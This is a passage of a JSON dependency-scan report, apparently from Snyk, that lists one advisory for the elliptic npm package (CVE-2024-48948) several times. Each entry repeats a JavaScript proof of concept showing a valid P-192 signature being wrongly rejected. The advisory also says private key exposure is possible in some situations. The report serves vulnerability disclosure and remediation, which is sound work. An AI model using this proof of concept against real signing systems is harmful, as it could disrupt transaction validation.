            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/contracts@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
